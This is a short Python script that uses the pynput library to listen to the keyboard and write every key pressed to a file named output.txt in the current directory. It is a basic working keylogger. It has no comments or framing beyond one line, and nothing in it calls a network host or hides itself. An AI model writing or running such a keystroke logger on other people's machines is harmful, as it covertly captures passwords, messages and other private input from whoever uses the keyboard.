from pynput.keyboard import Key, Listener
import logging
import os

logdir = os.getcwd()
logging.basicConfig(filename = ("output.txt"), level = logging.DEBUG)


def on_press(key):
    logging.info(key)

# Collect events until released
with Listener( on_press=on_press) as listener:
    listener.join()
